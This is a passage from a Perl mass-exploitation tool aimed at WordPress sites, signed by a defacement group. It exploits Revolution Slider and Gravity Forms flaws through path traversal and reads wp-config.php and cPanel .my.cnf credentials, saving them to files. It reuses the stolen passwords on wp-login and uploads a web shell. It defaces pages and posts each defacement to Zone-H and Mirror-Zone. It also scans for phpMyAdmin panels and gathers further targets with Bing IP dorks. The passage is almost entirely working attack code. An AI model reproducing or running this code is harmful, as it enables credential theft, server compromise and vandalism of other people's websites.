my $indexploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["top.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../../../", name => "done.html"]);
print "DEFACE ---------------------->:";
if ($indexploit->decoded_content =~ /_input_3_top.html/) {
    $def= $site . '_input_3_top.html';
print "SUCCESS";
print"\n";
        print "INDEX LINK => $def ","\n";
        zoneh();
        mirrorzon();
       }else{
        print "---------------------->: ERROR\n";
       }
   }
####################################################################################################
####################################################################################################
#####################################       REVSLIDER       ########################################
####################################################################################################
####################################################################################################
sub getconfig{
print "REVSLIDER GETCONFIG:";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$config = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";
$conflink = "$site/$config";
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print "---------------------->: ";
print "VULN";
print "\n";
print color('reset');
    open(save, '>>resault/vulntargets.txt');   
    print save "rev cnfg $site\n";   
    close(save);
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$cont = $resp->content;
while($cont =~ m/DB_NAME/g){


        if ($cont =~ /DB_NAME\', \'(.*)\'\)/){
        print "\t Database Name = $1 \n";
        open (TEXT, '>>resault/databases.txt');
        print TEXT "\n DATABASE  \n$site\n Database Name = $1";
        close (TEXT);
        }
        if ($cont =~ /DB_USER\', \'(.*)\'\)/){
        print "\t Database User = $1 \n";
        open (TEXT, '>>resault/databases.txt');
        print TEXT "\n Database User = $1";
        close (TEXT)
        }
        if ($cont =~ /DB_PASSWORD\', \'(.*)\'\)/){
        print "\t Database Password = $1 \n";
        $pass= $1 ;
        open (TEXT, '>>resault/databases.txt');
        print TEXT "\n Database Password = $pass";
        close (TEXT)
        }
        if ($cont =~ /DB_HOST\', \'(.*)\'\)/){
        print "\t Database Host = $1 \n\n";
        open (TEXT, '>>resault/databases.txt');
        print TEXT "\n Database Host = $1";
        close (TEXT)
        }

wpbrute();
getcpconfig();
}}else{
   print "---------------------->: ";
print "NOT VULN";
print "\n"; 
getcpconfig();

}

}

####################################################################################################
####################################################################################################

sub getcpconfig{
print "REVSLIDER GET CPANEL:";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$cpup = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf";
$cpuplink = "$site/$cpup";
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$cont = $resp->content;
if($cont =~ m/user=/g){
print "---------------------->: ";
print "FOUNDED";
print "\n";
    open(save, '>>resault/vulntargets.txt');   
    print save "rev cpnl $site\n";   
    close(save);
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$contt = $resp->content;
while($contt =~ m/user/g){
        if ($contt =~ /user=(.*)/){

        print "\n\t Cpanel User = $1 \n";
        open (TEXT, '>>resault/cpanels.txt');
        print TEXT "\n cpanel  \n$site\n cpanel user = $1";
        close (TEXT);
        }
        if ($contt =~ /password="(.*)"/){
        print "\t Cpanel Pass = $1 \n\n";
        open (TEXT, '>>resault/cpanels.txt');
        print TEXT "\n Cpanel Pass = $1";
        close (TEXT)
        }


}
}else{print "---------------------->: ";
print "NOT FOUNDED";
print "\n";
}


}




####################################################################################################
####################################################################################################
####################################################################################################
sub revdef(){
print "DEFACE AJAX:";

$ajx = $site . 'wp-admin/admin-ajax.php';

$def = $site .'wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css';

$gassface = POST $ajx, ['action' => 'revslider_ajax_action', 'client_action' => 'update_captions_css', 'data' =>"<body style='color: transparent;background-color: black'><center><h1><b style='color: white'><center><b>Hacked By Security Team Dz</b><br>Algeria EROR-DZ <p style='color: transparent'>"];
$response = $ua->request($gassface);
$stat = $response->content;
 if ($stat =~ /true/){
print  "---------------------->: ";
print "SUCCESS";
print "\n";


my $checkajx= $ua->get("$def")->content;
if($checkajx =~/Hacked|ERORDZ|Done/) {

        open(save, '>>resault/vulntargets.txt');   
    print save "rev deface $site\n";   
    close(save);

print "DEFACE ---------------------->: ";
print "SUCCESS";
print "\n";

print "LINK INDEX ---------------------->: ";
print "SAVED";
print "\n";

zoneh();
mirrorzon();
}
}else{
    print "---------------------->: \n";
print "ERROR";
print "\n";

}
}
####################################################################################################
####################################################################################################
############################### PHP MY ADMIN SCANNER ##############################################
####################################################################################################
####################################################################################################
sub zebbik{
print "PMA SCANNER:";
print "---------------------->: ";
print "WAIT";
print "\n";
use HTTP::Request;
use LWP::UserAgent;
@pat=('/phpMyAdmin/','/phpmyadmin/',
    '/PMA/',
    '/pma/',
    '/admin/',
    '/dbadmin/',
    '/mysql/',
    '/myadmin/',
    '/phpmyadmin2/',
    '/phpMyAdmin2/',
    '/phpMyAdmin-2/',
    '/php-my-admin/',
    '/phpMyAdmin-2.2.3/',
    '/phpMyAdmin-2.2.6/',
    '/phpMyAdmin-2.5.1/',
    '/phpMyAdmin-2.5.4/',
    '/phpMyAdmin-2.5.5-rc1/',
    '/phpMyAdmin-2.5.5-rc2/',
    '/phpMyAdmin-2.5.5/',
    '/phpMyAdmin-2.5.5-pl1/',
    '/phpMyAdmin-2.5.6-rc1/',
    '/phpMyAdmin-2.5.6-rc2/',
    '/phpMyAdmin-2.5.6/',
    '/phpMyAdmin-2.5.7/',
    '/phpMyAdmin-2.5.7-pl1/',
    '/phpMyAdmin-2.6.0-alpha/',
    '/phpMyAdmin-2.6.0-alpha2/',
    '/phpMyAdmin-2.6.0-beta1/',
    '/phpMyAdmin-2.6.0-beta2/',
    '/phpMyAdmin-2.6.0-rc1/',
    '/phpMyAdmin-2.6.0-rc2/',
    '/phpMyAdmin-2.6.0-rc3/',
    '/phpMyAdmin-2.6.0/',
    '/phpMyAdmin-2.6.0-pl1/',
    '/phpMyAdmin-2.6.0-pl2/',
    '/phpMyAdmin-2.6.0-pl3/',
    '/phpMyAdmin-2.6.1-rc1/',
    '/phpMyAdmin-2.6.1-rc2/',
    '/phpMyAdmin-2.6.1/',
    '/phpMyAdmin-2.6.1-pl1/',
    '/phpMyAdmin-2.6.1-pl2/',
    '/phpMyAdmin-2.6.1-pl3/',
    '/phpMyAdmin-2.6.2-rc1/',
    '/phpMyAdmin-2.6.2-beta1/',
    '/phpMyAdmin-2.6.2-rc1/',
    '/phpMyAdmin-2.6.2/',
    '/phpMyAdmin-2.6.2-pl1/',
    '/phpMyAdmin-2.6.3/',
    '/phpMyAdmin-2.6.3-rc1/',
    '/phpMyAdmin-2.6.3/',
    '/phpMyAdmin-2.6.3-pl1/',
    '/phpMyAdmin-2.6.4-rc1/',
    '/phpMyAdmin-2.6.4-pl1/',
    '/phpMyAdmin-2.6.4-pl2/',
    '/phpMyAdmin-2.6.4-pl3/',
    '/phpMyAdmin-2.6.4-pl4/',
    '/phpMyAdmin-2.6.4/',
    '/phpMyAdmin-2.7.0-beta1/',
    '/phpMyAdmin-2.7.0-rc1/',
    '/phpMyAdmin-2.7.0-pl1/',
    '/phpMyAdmin-2.7.0-pl2/',
    '/phpMyAdmin-2.7.0/',
    '/phpMyAdmin-2.8.0-beta1/',
    '/phpMyAdmin-2.8.0-rc1/',
    '/phpMyAdmin-2.8.0-rc2/',
    '/phpMyAdmin-2.8.0/',
    '/phpMyAdmin-2.8.0.1/',
    '/phpMyAdmin-2.8.0.2/',
    '/phpMyAdmin-2.8.0.3/',
    '/phpMyAdmin-2.8.0.4/',
    '/phpMyAdmin-2.8.1-rc1/',
    '/phpMyAdmin-2.8.1/',
    '/phpMyAdmin-2.8.2/',
    '/sqlmanager/',
    '/mysqlmanager/',
    '/p/m/a/',
    '/PMA2005/',
    '/pma2005/',
    '/phpmanager/',
    '/php-myadmin/',
    '/phpmy-admin/',
    '/webadmin/',
    '/sqlweb/',
    '/websql/',
    '/webdb/',
    '/mysqladmin/',
    '/mysql-admin/');
foreach $pma(@pat){
chomp $pma;

$url = $site.$pma;
$req = HTTP::Request->new(GET=>$url);
$userAgent = LWP::UserAgent->new();
$response = $userAgent->request($req);
$ar = $response->content;
if ($ar =~ m/Welcome to phpMyAdmin|Username|Password/g){
print "$pma ---------------------->: ";
print "FOUNDED";
print "\n";
open (TEXT, '>>resault/databases.txt');
print TEXT "\n PhpMyAdmin $url   =>   PMA Founded !!\n\n";
close (TEXT);

}else{

print "$pma ---------------------->: ";
print "NOT FOUNDED";
print "\n";

}}
print "PMA SCAN ---------------------->: ";
print "DONE";
print "\n";
}
#######################################################
sub zebbi{
print "PMA SCANNER:";
print "---------------------->: ";
print "WAIT";
print "\n";
use HTTP::Request;
use LWP::UserAgent;
@pat=('/phpMyAdmin/','/phpmyadmin/',
    '/PMA/',
    '/pma/',
    '/admin/',
    '/dbadmin/',
    '/mysql/',
    '/myadmin/',
    '/phpmyadmin2/',
    '/phpMyAdmin2/',
    '/phpMyAdmin-2/',
    '/php-my-admin/',
    '/phpMyAdmin-2.2.3/',
    '/phpMyAdmin-2.2.6/',
    '/phpMyAdmin-2.5.1/',
    '/phpMyAdmin-2.5.4/',
    '/phpMyAdmin-2.5.5-rc1/',
    '/phpMyAdmin-2.5.5-rc2/',
    '/phpMyAdmin-2.5.5/',
    '/phpMyAdmin-2.5.5-pl1/',
    '/phpMyAdmin-2.5.6-rc1/',
    '/phpMyAdmin-2.5.6-rc2/',
    '/phpMyAdmin-2.5.6/',
    '/phpMyAdmin-2.5.7/',
    '/phpMyAdmin-2.5.7-pl1/',
    '/phpMyAdmin-2.6.0-alpha/',
    '/phpMyAdmin-2.6.0-alpha2/',
    '/phpMyAdmin-2.6.0-beta1/',
    '/phpMyAdmin-2.6.0-beta2/',
    '/phpMyAdmin-2.6.0-rc1/',
    '/phpMyAdmin-2.6.0-rc2/',
    '/phpMyAdmin-2.6.0-rc3/',
    '/phpMyAdmin-2.6.0/',
    '/phpMyAdmin-2.6.0-pl1/',
    '/phpMyAdmin-2.6.0-pl2/',
    '/phpMyAdmin-2.6.0-pl3/',
    '/phpMyAdmin-2.6.1-rc1/',
    '/phpMyAdmin-2.6.1-rc2/',
    '/phpMyAdmin-2.6.1/',
    '/phpMyAdmin-2.6.1-pl1/',
    '/phpMyAdmin-2.6.1-pl2/',
    '/phpMyAdmin-2.6.1-pl3/',
    '/phpMyAdmin-2.6.2-rc1/',
    '/phpMyAdmin-2.6.2-beta1/',
    '/phpMyAdmin-2.6.2-rc1/',
    '/phpMyAdmin-2.6.2/',
    '/phpMyAdmin-2.6.2-pl1/',
    '/phpMyAdmin-2.6.3/',
    '/phpMyAdmin-2.6.3-rc1/',
    '/phpMyAdmin-2.6.3/',
    '/phpMyAdmin-2.6.3-pl1/',
    '/phpMyAdmin-2.6.4-rc1/',
    '/phpMyAdmin-2.6.4-pl1/',
    '/phpMyAdmin-2.6.4-pl2/',
    '/phpMyAdmin-2.6.4-pl3/',
    '/phpMyAdmin-2.6.4-pl4/',
    '/phpMyAdmin-2.6.4/',
    '/phpMyAdmin-2.7.0-beta1/',
    '/phpMyAdmin-2.7.0-rc1/',
    '/phpMyAdmin-2.7.0-pl1/',
    '/phpMyAdmin-2.7.0-pl2/',
    '/phpMyAdmin-2.7.0/',
    '/phpMyAdmin-2.8.0-beta1/',
    '/phpMyAdmin-2.8.0-rc1/',
    '/phpMyAdmin-2.8.0-rc2/',
    '/phpMyAdmin-2.8.0/',
    '/phpMyAdmin-2.8.0.1/',
    '/phpMyAdmin-2.8.0.2/',
    '/phpMyAdmin-2.8.0.3/',
    '/phpMyAdmin-2.8.0.4/',
    '/phpMyAdmin-2.8.1-rc1/',
    '/phpMyAdmin-2.8.1/',
    '/phpMyAdmin-2.8.2/',
    '/sqlmanager/',
    '/mysqlmanager/',
    '/p/m/a/',
    '/PMA2005/',
    '/pma2005/',
    '/phpmanager/',
    '/php-myadmin/',
    '/phpmy-admin/',
    '/webadmin/',
    '/sqlweb/',
    '/websql/',
    '/webdb/',
    '/mysqladmin/',
    '/mysql-admin/');
foreach $pma(@pat){
chomp $pma;

$url = $site.$pma;
$req = HTTP::Request->new(GET=>$url);
$userAgent = LWP::UserAgent->new();
$response = $userAgent->request($req);
$ar = $response->content;
if ($ar =~ m/Welcome to phpMyAdmin|Username|Password/g){
print "$pma ---------------------->: ";
print "FOUNDED";
print "\n";
open (TEXT, '>>resault/databases.txt');
print TEXT "\n PhpMyAdmin $url   =>   PMA Founded !!\n\n";
close (TEXT);

}else{

print "$pma ---------------------->: ";
print "NOT FOUNDED";
print "\n";

}}
print "PMA SCAN ---------------------->: ";
print "DONE";
print "\n";
revdef();
}
####################################################################################################
####################################################################################################
####################################### WORDPRESS BRUTE ############################################
####################################################################################################
####################################################################################################
sub wpbrute{
print "BRUTE WITH CONFIG PASS:";
$red = $site . '/wp-admin/';
$wp= $site . 'wp-login.php';
$admin = "admin";
print "---------------------->: ";
print "WAIT";
print "\n";

print "INFO USER : $admin\n INFO PASSWORD : $pass\n";
$brute = POST $wp, [log => $admin, pwd => $pass, wp-submit => 'Log In', redirect_to => $red];
$response = $ua->request($brute);
$stat = $response->status_line;
        if ($stat =~ /302/){
print "BRUTE ---------------------->: ";
print "LOGIN SUCCESS";
print "\n";
        open (TEXT, '>>resault/brute.txt');
        print TEXT "\n BRUTE BOOM $site/wp-login.php => User :$admin Password:$pass\n";
        close (TEXT);
        }else{
            print "BRUTE:---------------------->:";
print "USER AND PASSWORD DONT MATCH";
print "\n";

}
zebbi();
}
#############################################
sub wpbrutek{
print "BRUTE WITH CONFIG PASS";
$red = $site . '/wp-admin/';
$wp= $site . 'wp-login.php';
$admin = "admin";
print "---------------------->: ";
print "WAIT";
print "\n";

print "INFO USER : $admin\n[INFO] PASSWORD : $pass\n";
$brute = POST $wp, [log => $admin, pwd => $pass, wp-submit => 'Log In', redirect_to => $red];
$response = $ua->request($brute);
$stat = $response->status_line;
        if ($stat =~ /302/){
print "BRUTE ---------------------->: ";           
print "LOGIN SUCCESS";
print "\n";
        open (TEXT, '>>resault/brute.txt');
        print TEXT "\n BRUTE BOOM $site/wp-login.php => User :$admin Password:$pass\n";
        close (TEXT);
        }else{
            print " BRUTE ---------------------->:";
print "USER AND PASSWORD DONT MATCH";
print "\n";

}
zebbik();
}
####################################################################################################
####################################################################################################
##################################     REVSLIDER SHELL     #########################################
####################################################################################################
####################################################################################################
sub revshell(){
print "REVSLIDER SHELL:";
if($site !~ /http:\/\//) { $site = "http://$site/"; };
my $zip = "revslider.zip";
my $action;
my $update_file;
$action = "revslider_ajax_action";
$update_file = "$zip";
my $targd = "wp-admin/admin-ajax.php";
my $herwgo = "$site/wp-content/plugins/revslider/temp/update_extract/revslider/herewgo.php"; 

sub randomagent {
my @array = ('Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
);
my $random = $array[rand @array];
return($random);
}
my $useragent = randomagent();

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent($useragent);
my $exploit = $ua->post("$site/$targd", Cookie => "", Content_Type => "form-data", Content => [action => "$action", client_action => "update_plugin", update_file => ["$update_file"]]);
if ($exploit->decoded_content =~ /Wrong update extracted folder/) {
print "---------------------->: ";
print "VULN";
print "\n";
print "UPLOAD SHELL";
my $exploitrevshell = $ua->get("$herwgo")->content;
my $exploitrevshellz = $ua->get("$site/xxs.php")->content;
if($exploitrevshellz =~/<form method=post>Password: <input type=password name=pass><input type=submit value=/) {
    print "---------------------->: ";
print "OK";
print "\n";
print "SHELL LINK => $site/xxs.php\n";
    open(save, '>>resault/shells.txt');  
    print save "REVSLIDER $site/xxs.php\n";  
    close(save);
my $checkun = $ua->get("$site/un.php")->content;
if($checkun =~ /path:(.*)<b><br>uname:(.*)<br><\/b>fallagateam/){
    print "\n";
print "Path : $1","\n\n";

print "Kernel:$2","\n";
    open(save, '>>resault/shells.txt');  
    print save "Path : $1\nKernel:$2\n";
    close(save);
$def="$site/done.html";
print "INDEX LINK => $def \n";

zoneh();
mirrorzon();
}
}else{
print "---------------------->: ";
print "ERROR";
print "\n";
getconfig();
}
}
else {
print "---------------------->: ";
print "NOT VULN";
print "\n";

getconfig();
}
}

####################################################################################################
####################################################################################################
######################################    zone h poster      #######################################
####################################################################################################
####################################################################################################
sub zoneh(){
#  // this to post all our deface on zone-h //
print "ZONE-H:";
    open(save, '>>resault/index.txt');   
    print save "$def\n";   
    close(save);
                                
                                $hack="ERORDZ"; # chaneg D.R.S Dz Team Team bY Your zone h name :p - thats not recode lamerz lol ..//
                                $zn="http:///notify/single";
                                $lwp=LWP::UserAgent->new;
                                $res=$lwp  -> post($zn,[
                                'defacer'     => $hack,
                                'domain1'   => $def,
                                'hackmode' => '15',
                                'reason'       => '1',
                                'submit'       => 'Send',
                                ]);
                                if ($res->content =~ />ERROR<\/font><\/li>/) {
                                print ":---------------------->: ";
print "ERROR";
print "\n";

                                }
                                elsif ($res->content =~ />OK<\/font><\/li>/) {
                                print ":---------------------->: ";
print "OK";
print "\n";

                                }
                                else
                                {
                                print " ERROR ! Error Can't Submit it On Zone-h drs","\n";

                                }
                            }
####################################################################################################
####################################################################################################
##################################### Mirror zone poster     #######################################
####################################################################################################
####################################################################################################
sub mirrorzon(){
    #  for mirror zone post xD 
    print "MIRROR-ZONE:";
$mz = "http://mirror-zone.org/notify/singel.php";
$fgtn="ERORDZ"; # u can change it by ur name on mirror zone and plz madafaking bitchs dont call this recode lol !
$mzp = POST $mz, hacker => $fgtn, text => $def;
$response = $ua->request($mzp);
if ($response->content =~ /Deface Add successfully added to Archive .../) {
print "---------------------->: ";
print "OK";
print "\n";
}else {
print "---------------------->: ";
print "ERROR";
print "\n";
}
}
sub adminchk($site){
print "Admin:---------------------->: ";
$k = $site . '/admin/';
my $checkadm= $ua->get("$k")->content;
if($checkadm =~/type=\"password\"/) {
        open(save, '>>resault/admin.txt');   
    print save "$site/admin\n";   
    close(save);
print "OK";
print " \n\n";
}else {
print "ERROR";
print " \n\n";
}
}
sub opchk($site){
print "OPENCART:---------------------->: ";
$k = $site . '/admin/';
my $checkadm= $ua->get("$k")->content;
if($checkadm =~/common\/forgotten/) {
open(save, '>>resault/opencart.txt');   
 print save "$site\n";   
  close(save);
print "OK";
print "\n\n";
}else {
print "ERROR";
print "\n\n";
}
}

if($targett eq 'ERORDZ')
{
}
##############################
sub gett(){
$ip= (gethostbyname($tofuck))[4];
my ($a,$b,$c,$d) = unpack('C4',$ip);
for ($i = 1; $i <= 255; $i+=1){
$ips ="$a.$b.$c.$i";
OUTER: foreach $ip($ips){
print " IP:--> $ips\n";
        print TEXT "$ips\n";
        close (TEXT);
$dork="ip:$ips";
gassone();
}
}
}
#############################
sub get(){

$ip= (gethostbyname($tofuck))[4];
my ($a,$b,$c,$d) = unpack('C4',$ip);
$ips="$a.$b.$c.$d";
print " IP : $ips\n";
        print TEXT "$ips\n";
        close (TEXT);
$dork="ip:$ips";
gassone();
}
####################################"
sub gassone(){
for ($ii = 1; $ii <= 2000; $ii+=10){

$url = "http://www.bing.com/search?q=$dork&filt=all&first=$ii&FORM=PERE";
$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){



$link = $1;
	if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
	{
				if ($link !~ /^http:/)
			 {
				$link = 'http://' . "$link" . '/';
			 }



if($link !~ /\"|\?|\=|index\.php/){
					if  (!  grep (/$link/,@result))
					{
print "$link\n";
open(save, '>>sites.txt');
    print save "$link\n";
    close(save);
						push(@result,$link);
					}
} 
}
}
####
if ($rrs !~ m/class=\"sb_pagN\"/g){
next OUTER;
}
}
}
###########
sub gassonee(){
for ($ii = 1; $ii <= 2000; $ii+=10){

$url = "http://www.bing.com/search?q=$dork&filt=all&first=$ii&FORM=PERE";
$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){



$link = $1;
	if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
	{
				if ($link !~ /^http:/)
			 {
				$link = 'http://' . "$link" . '/';
			 }



if($link !~ /\"|\?|\=|index\.php/){
					if  (!  grep (/$link/,@result))
					{
print "$link\n";
open(save, '>>sites.txt');
    print save "$link\n";
    close(save);
						push(@result,$link);
					}
} 
}
}
####
if ($rrs !~ m/class=\"sb_pagN\"/g){
exit;
}
}
}
print "\n\n\Get'z to all mY Friends <3 \n";
